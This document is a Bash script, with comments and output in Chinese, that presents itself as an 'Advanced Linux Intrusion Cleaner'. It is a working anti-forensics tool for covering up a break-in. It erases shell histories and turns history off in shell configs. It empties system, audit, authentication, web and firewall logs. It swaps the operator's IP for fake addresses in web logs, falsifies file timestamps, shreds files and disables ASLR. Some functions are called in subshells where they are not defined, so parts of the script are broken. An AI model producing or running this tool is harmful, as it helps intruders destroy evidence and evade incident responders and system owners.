#!/bin/bash

# Linux 高级入侵痕迹清理工具 (Bash版本)
# Advanced Linux Intrusion Cleaner (Bash Version)

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# 全局变量
CURRENT_USER=$(whoami)
HOME_DIR="$HOME"
FAKE_IPS=("192.168.1.1" "192.168.1.100" "10.0.0.1" "172.16.0.1" "8.8.8.8" "1.1.1.1")
CURRENT_IP=""
AUTO_MODE=false

# 打印横幅
print_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║              Linux 高级入侵痕迹清理工具 (Bash版)              ║
║            Advanced Linux Intrusion Cleaner (Bash)           ║
║                                                              ║
║  功能: 历史记录 | 系统日志 | Web日志 | 文件删除 | 时间戳修改   ║
║  高级: 进程隐藏 | 网络痕迹 | 内核痕迹 | 内存清理 | 反取证     ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# 打印信息
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# 打印成功
print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# 打印警告
print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# 打印错误
print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 检查是否为root用户
check_root() {
    if [[ $EUID -eq 0 ]]; then
        return 0
    else
        return 1
    fi
}

# 检查命令是否存在
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# 获取当前IP地址
get_current_ip() {
    if command_exists curl; then
        CURRENT_IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")
    elif command_exists wget; then
        CURRENT_IP=$(wget -qO- ifconfig.me 2>/dev/null || echo "unknown")
    else
        CURRENT_IP="unknown"
    fi
}

# 生成随机时间戳
generate_fake_timestamp() {
    # 生成过去30天内的随机时间
    local days_ago=$((RANDOM % 30 + 1))
    local hours_ago=$((RANDOM % 24))
    local minutes_ago=$((RANDOM % 60))
    
    # 使用date命令生成时间戳
    local fake_time=$(date -d "$days_ago days ago $hours_ago hours ago $minutes_ago minutes ago" +"%Y%m%d%H%M" 2>/dev/null || echo "202301010000")
    echo "$fake_time"
}

# 修改文件时间戳
modify_file_timestamp() {
    local file_path="$1"
    if [[ -f "$file_path" ]]; then
        local fake_timestamp=$(generate_fake_timestamp)
        if touch -t "$fake_timestamp" "$file_path" 2>/dev/null; then
            print_success "已修改文件时间戳: $file_path"
            return 0
        else
            print_error "修改时间戳失败: $file_path"
            return 1
        fi
    fi
    return 1
}

# 高级历史记录清理
clear_history_advanced() {
    print_info "正在执行高级历史记录清理..."
    
    # 基础清理
    history -c 2>/dev/null
    history -w 2>/dev/null
    
    # 清空所有可能的历史文件
    local history_files=(
        ".bash_history" ".zsh_history" ".bash_sessions" ".python_history"
        ".node_repl_history" ".mysql_history" ".sqlite_history" ".psql_history"
        ".lesshst" ".viminfo" ".vim_history" ".nano_history" ".irb_history"
        ".gem_history" ".npm_history" ".yarn_history" ".composer_history"
    )
    
    for hist_file in "${history_files[@]}"; do
        local file_path="$HOME_DIR/$hist_file"
        if [[ -f "$file_path" ]]; then
            modify_file_timestamp "$file_path"
            rm -f "$file_path" && print_success "已删除并修改时间戳: $hist_file"
        fi
    done
    
    # 设置环境变量
    export HISTFILE=/dev/null
    export HISTSIZE=0
    export HISTFILESIZE=0
    export HISTCONTROL=ignorespace:ignoredups:erasedups
    export HISTIGNORE="*"
    
    # 清理shell配置文件中的历史设置
    local shell_configs=(".bashrc" ".bash_profile" ".zshrc" ".profile" ".bash_login" ".zprofile")
    for config in "${shell_configs[@]}"; do
        local config_path="$HOME_DIR/$config"
        if [[ -f "$config_path" ]]; then
            # 备份原文件
            cp "$config_path" "$config_path.backup" 2>/dev/null
            
            # 添加禁用历史的配置
            if ! grep -q "HISTFILE=/dev/null" "$config_path"; then
                cat >> "$config_path" << 'EOF'

# Disable history for security
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
export HISTCONTROL=ignorespace:ignoredups:erasedups
export HISTIGNORE="*"
unset HISTFILE HISTSIZE HISTFILESIZE HISTCONTROL
EOF
                print_success "已修改 $config 禁用历史记录"
            fi
        fi
    done
}

# 高级系统日志清理
clear_system_logs_advanced() {
    print_info "正在执行高级系统日志清理..."
    
    if ! check_root; then
        print_error "需要root权限才能清除系统日志"
        return 1
    fi
    
    # 扩展的日志文件列表
    declare -A log_files=(
        ["/var/log/btmp"]="登录失败记录"
        ["/var/log/wtmp"]="登录成功记录"
        ["/var/log/lastlog"]="最后登录时间"
        ["/var/log/utmp"]="当前登录用户"
        ["/var/log/secure"]="安全日志"
        ["/var/log/messages"]="系统消息日志"
        ["/var/log/auth.log"]="认证日志"
        ["/var/log/syslog"]="系统日志"
        ["/var/log/kern.log"]="内核日志"
        ["/var/log/dmesg"]="设备消息"
        ["/var/log/faillog"]="失败登录日志"
        ["/var/log/tallylog"]="登录尝试日志"
        ["/var/log/audit/audit.log"]="审计日志"
        ["/var/log/cron"]="定时任务日志"
        ["/var/log/maillog"]="邮件日志"
        ["/var/log/spooler"]="假脱机日志"
        ["/var/log/boot.log"]="启动日志"
        ["/var/log/dpkg.log"]="包管理日志"
        ["/var/log/apt/history.log"]="APT历史日志"
        ["/var/log/yum.log"]="YUM日志"
        ["/var/log/dnf.log"]="DNF日志"
        ["/var/log/pacman.log"]="Pacman日志"
    )
    
    for log_file in "${!log_files[@]}"; do
        if [[ -f "$log_file" ]]; then
            modify_file_timestamp "$log_file"
            > "$log_file" && print_success "已清空并修改时间戳: ${log_files[$log_file]} ($log_file)"
        fi
    done
    
    # 清理journalctl日志
    if command_exists journalctl; then
        journalctl --vacuum-time=1s >/dev/null 2>&1 && print_success "已清除journalctl日志"
        journalctl --vacuum-size=1K >/dev/null 2>&1
        journalctl --rotate >/dev/null 2>&1
        journalctl --flush >/dev/null 2>&1
    fi
    
    # 清理其他日志目录
    local log_dirs=(
        "/var/log/audit" "/var/log/apache2" "/var/log/nginx" "/var/log/lighttpd"
        "/var/log/httpd" "/var/log/squid" "/var/log/mail" "/var/log/news"
        "/var/log/debug" "/var/log/daemon.log" "/var/log/user.log"
        "/var/log/lpr.log" "/var/log/emerg" "/var/log/alert"
        "/var/log/critical" "/var/log/error" "/var/log/warning"
        "/var/log/notice" "/var/log/info"
    )
    
    for log_dir in "${log_dirs[@]}"; do
        if [[ -d "$log_dir" ]]; then
            find "$log_dir" -name "*.log*" -type f -exec sh -c '
                for file do
                    modify_file_timestamp "$file"
                    > "$file"
                    print_success "已清空并修改时间戳: $file"
                done
            ' sh {} + 2>/dev/null
        fi
    done
}

# 高级Web日志清理
clear_web_logs_advanced() {
    print_info "正在执行高级Web日志清理..."
    
    # 获取当前IP地址
    get_current_ip
    
    # 扩展的Web日志文件列表
    local web_log_files=(
        "/var/log/nginx/access.log" "/var/log/nginx/error.log"
        "/var/log/apache2/access.log" "/var/log/apache2/error.log"
        "/var/log/httpd/access_log" "/var/log/httpd/error_log"
        "/var/log/lighttpd/access.log" "/var/log/lighttpd/error.log"
        "/var/log/squid/access.log" "/var/log/squid/cache.log"
        "/var/log/tomcat/catalina.out" "/var/log/tomcat/localhost.log"
        "/var/log/jetty/jetty.log" "/var/log/wildfly/server.log"
        "/var/log/php-fpm/error.log" "/var/log/php/error.log"
        "/var/log/mysql/error.log" "/var/log/postgresql/postgresql.log"
    )
    
    for log_file in "${web_log_files[@]}"; do
        if [[ -f "$log_file" ]]; then
            modify_file_timestamp "$log_file"
            
            # 替换IP地址为随机虚假IP
            local fake_ip=${FAKE_IPS[$((RANDOM % ${#FAKE_IPS[@]}))]}
            if [[ "$CURRENT_IP" != "unknown" ]]; then
                sed -i "s/$CURRENT_IP/$fake_ip/g" "$log_file" 2>/dev/null
                print_success "已替换IP地址为 $fake_ip in $log_file"
            fi
            
            # 删除包含特定关键词的行
            local keywords=("evil" "hack" "exploit" "backdoor" "shell" "rootkit" "trojan" "virus" "malware")
            for keyword in "${keywords[@]}"; do
                sed -i "/$keyword/d" "$log_file" 2>/dev/null
            done
            
            # 清空日志文件
            > "$log_file" && print_success "已清空并清理关键词: $log_file"
        fi
    done
}

# 高级文件安全删除
secure_delete_file_advanced() {
    local file_path="$1"
    
    if [[ ! -f "$file_path" ]]; then
        print_error "文件不存在: $file_path"
        return 1
    fi
    
    print_info "正在执行高级安全删除: $file_path"
    
    # 修改文件时间戳
    modify_file_timestamp "$file_path"
    
    # 方法1: 使用shred命令 (增强版)
    if command_exists shred; then
        if shred -f -u -z -v -n 10 "$file_path" 2>/dev/null; then
            print_success "已使用shred高级删除: $file_path"
            return 0
        fi
    fi
    
    # 方法2: 使用dd命令多次覆盖
    if command_exists dd; then
        local file_size=$(stat -c%s "$file_path" 2>/dev/null || echo "0")
        if [[ $file_size -gt 0 ]]; then
            # 多次覆盖
            for i in {1..5}; do
                dd if=/dev/urandom of="$file_path" bs=1M count=$((file_size/1024/1024 + 1)) >/dev/null 2>&1
                dd if=/dev/zero of="$file_path" bs=1M count=$((file_size/1024/1024 + 1)) >/dev/null 2>&1
            done
            rm -f "$file_path" && print_success "已使用dd多次覆盖删除: $file_path"
            return 0
        fi
    fi
    
    # 方法3: 使用wipe命令
    if command_exists wipe; then
        if wipe -f "$file_path" >/dev/null 2>&1; then
            print_success "已使用wipe删除: $file_path"
            return 0
        fi
    fi
    
    # 方法4: 使用srm命令
    if command_exists srm; then
        if srm -f "$file_path" >/dev/null 2>&1; then
            print_success "已使用srm删除: $file_path"
            return 0
        fi
    fi
    
    print_error "所有安全删除方法都失败了: $file_path"
    return 1
}

# 隐藏进程痕迹
hide_process_traces() {
    print_info "正在隐藏进程痕迹..."
    
    # 清理进程相关日志
    local proc_logs=("/proc/self/environ" "/proc/self/cmdline" "/proc/self/status")
    
    # 清理/proc文件系统痕迹
    if check_root; then
        echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null && print_success "已限制dmesg访问"
        
        # 清理内核消息
        dmesg -c >/dev/null 2>&1 && print_success "已清除内核消息"
        
        # 清理进程统计信息
        echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null && print_success "已禁用地址空间随机化"
    fi
    
    # 清理进程相关文件
    local proc_dirs=("/proc" "/sys" "/dev")
    for proc_dir in "${proc_dirs[@]}"; do
        if [[ -d "$proc_dir" ]]; then
            find "$proc_dir" -name "*history*" -type f -delete 2>/dev/null
            find "$proc_dir" -name "*log*" -type f -delete 2>/dev/null
        fi
    done
}

# 清理网络痕迹
clear_network_traces() {
    print_info "正在清理网络痕迹..."
    
    if ! check_root; then
        print_error "需要root权限才能清理网络痕迹"
        return 1
    fi
    
    # 清理网络连接记录
    local net_commands=("netstat" "ss" "lsof" "ip")
    
    # 清理ARP缓存
    ip neigh flush all >/dev/null 2>&1 && print_success "已清理ARP缓存"
    
    # 清理路由缓存
    ip route flush cache >/dev/null 2>&1 && print_success "已清理路由缓存"
    
    # 清理网络统计
    > /proc/net/dev 2>/dev/null && print_success "已清理网络统计"
    
    # 清理防火墙日志
    local firewall_logs=("/var/log/iptables.log" "/var/log/ufw.log" "/var/log/firewalld.log")
    
    for log_file in "${firewall_logs[@]}"; do
        if [[ -f "$log_file" ]]; then
            modify_file_timestamp "$log_file"
            > "$log_file" && print_success "已清空防火墙日志: $log_file"
        fi
    done
    
    # 清理网络接口统计
    for interface in $(ip link show | grep -E "^[0-9]+:" | cut -d: -f2 | tr -d ' '); do
        ip link set "$interface" down 2>/dev/null
        ip link set "$interface" up 2>/dev/null
    done
}

# 清理内核痕迹
clear_kernel_traces() {
    print_info "正在清理内核痕迹..."
    
    if ! check_root; then
        print_error "需要root权限才能清理内核痕迹"
        return 1
    fi
    
    # 清理内核消息
    local kernel_commands=(
        "dmesg -c"
        "echo 1 > /proc/sys/kernel/dmesg_restrict"
        "echo 0 > /proc/sys/kernel/printk"
    )
    
    for cmd in "${kernel_commands[@]}"; do
        eval "$cmd" >/dev/null 2>&1 && print_success "已执行: $cmd"
    done
    
    # 清理内核模块
    if command_exists lsmod; then
        local suspicious_modules=("rootkit" "backdoor" "hack" "trojan")
        for module in "${suspicious_modules[@]}"; do
            if lsmod | grep -q "$module"; then
                rmmod "$module" 2>/dev/null && print_success "已卸载可疑模块: $module"
            fi
        done
    fi
    
    # 清理内核日志
    local kernel_logs=("/var/log/kern.log" "/var/log/dmesg" "/proc/kmsg")
    for log_file in "${kernel_logs[@]}"; do
        if [[ -f "$log_file" ]]; then
            modify_file_timestamp "$log_file"
            > "$log_file" 2>/dev/null && print_success "已清空内核日志: $log_file"
        fi
    done
}

# 反取证技术
anti_forensics() {
    print_info "正在执行反取证操作..."
    
    if ! check_root; then
        print_error "需要root权限才能执行反取证操作"
        return 1
    fi
    
    # 清理文件系统信息
    local fs_commands=(
        "sync"
        "echo 3 > /proc/sys/vm/drop_caches"
        "echo 1 > /proc/sys/vm/compact_memory"
    )
    
    for cmd in "${fs_commands[@]}"; do
        eval "$cmd" >/dev/null 2>&1 && print_success "已执行: $cmd"
    done
    
    # 清理内存
    swapoff -a && swapon -a >/dev/null 2>&1 && print_success "已清理swap分区"
    
    # 清理临时文件
    local temp_dirs=("/tmp" "/var/tmp" "/dev/shm" "/run/user/$(id -u)")
    for temp_dir in "${temp_dirs[@]}"; do
        if [[ -d "$temp_dir" ]]; then
            find "$temp_dir" -type f -exec sh -c 'secure_delete_file_advanced "$1"' sh {} \; 2>/dev/null
        fi
    done
    
    # 清理系统缓存
    local cache_dirs=("/var/cache" "/var/spool" "/var/lib/systemd/coredump")
    for cache_dir in "${cache_dirs[@]}"; do
        if [[ -d "$cache_dir" ]]; then
            find "$cache_dir" -type f -exec sh -c 'modify_file_timestamp "$1"' sh {} \; 2>/dev/null
        fi
    done
    
    # 清理用户缓存
    local user_cache_dirs=("$HOME/.cache" "$HOME/.local/share" "$HOME/.config")
    for cache_dir in "${user_cache_dirs[@]}"; do
        if [[ -d "$cache_dir" ]]; then
            find "$cache_dir" -type f -exec sh -c 'modify_file_timestamp "$1"' sh {} \; 2>/dev/null
        fi
    done
}

# 显示高级菜单
show_advanced_menu() {
    echo -e "${PURPLE}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                    高级菜单 / Advanced Menu                    ║
╠══════════════════════════════════════════════════════════════╣
║  1. 高级历史记录清理 (Advanced History Clean)                 ║
║  2. 高级系统日志清理 (Advanced System Logs Clean)             ║
║  3. 高级Web日志清理 (Advanced Web Logs Clean)                ║
║  4. 高级文件安全删除 (Advanced Secure Delete)                 ║
║  5. 隐藏进程痕迹 (Hide Process Traces)                       ║
║  6. 清理网络痕迹 (Clear Network Traces)                      ║
║  7. 清理内核痕迹 (Clear Kernel Traces)                       ║
║  8. 反取证操作 (Anti-Forensics)                              ║
║  9. 一键高级清理 (Advanced Clean All)                        ║
║  10. 返回主菜单 (Back to Main Menu)                          ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# 高级交互式模式
advanced_interactive_mode() {
    while true; do
        show_advanced_menu
        echo -n "请选择操作 (1-10): "
        read -r choice
        
        case $choice in
            1)
                clear_history_advanced
                ;;
            2)
                clear_system_logs_advanced
                ;;
            3)
                clear_web_logs_advanced
                ;;
            4)
                echo -n "请输入要删除的文件路径: "
                read -r file_path
                if [[ -n "$file_path" ]]; then
                    secure_delete_file_advanced "$file_path"
                fi
                ;;
            5)
                hide_process_traces
                ;;
            6)
                clear_network_traces
                ;;
            7)
                clear_kernel_traces
                ;;
            8)
                anti_forensics
                ;;
            9)
                print_info "开始一键高级清理..."
                clear_history_advanced
                clear_system_logs_advanced
                clear_web_logs_advanced
                hide_process_traces
                clear_network_traces
                clear_kernel_traces
                anti_forensics
                print_success "一键高级清理完成!"
                ;;
            10)
                break
                ;;
            *)
                print_error "无效选择，请重新输入"
                ;;
        esac
        
        if [[ "$AUTO_MODE" == false ]]; then
            echo -e "\n按回车键继续..."
            read -r
        fi
    done
}

# 自动高级清理模式
auto_advanced_clean() {
    print_info "开始自动高级清理所有痕迹..."
    local start_time=$(date +%s)
    
    clear_history_advanced
    clear_system_logs_advanced
    clear_web_logs_advanced
    hide_process_traces
    clear_network_traces
    clear_kernel_traces
    anti_forensics
    
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    print_success "自动高级清理完成! 耗时: ${duration} 秒"
    print_warning "建议重启系统以确保所有痕迹被完全清除"
    print_info "高级清理已完成，包含反取证技术"
}

# 显示帮助
show_help() {
    cat << "EOF"
Linux 高级入侵痕迹清理工具 (Bash版本)

使用方法:
  ./advanced_cleaner.sh          # 高级交互式模式
  ./advanced_cleaner.sh --auto   # 自动高级清理模式
  ./advanced_cleaner.sh --help   # 显示帮助

高级功能特性:
  - 高级历史记录清理
  - 高级系统日志清理
  - 高级Web日志清理
  - 高级文件安全删除
  - 隐藏进程痕迹
  - 清理网络痕迹
  - 清理内核痕迹
  - 反取证技术
  - 时间戳修改
  - IP地址替换

注意事项:
  - 某些操作需要root权限
  - 请确保在合法环境下使用
  - 建议在测试环境中先验证功能
  - 高级功能包含反取证技术
EOF
}

# 主函数
main() {
    # 检查参数
    case "${1:-}" in
        --auto)
            AUTO_MODE=true
            print_banner
            auto_advanced_clean
            ;;
        --help|-h)
            show_help
            exit 0
            ;;
        "")
            print_banner
            advanced_interactive_mode
            ;;
        *)
            print_error "无效参数，使用 --help 查看帮助"
            exit 1
            ;;
    esac
}

# 设置信号处理
trap 'echo -e "\n\n${YELLOW}👋 用户中断，再见!${NC}"; exit 0' INT

# 运行主函数
main "$@"
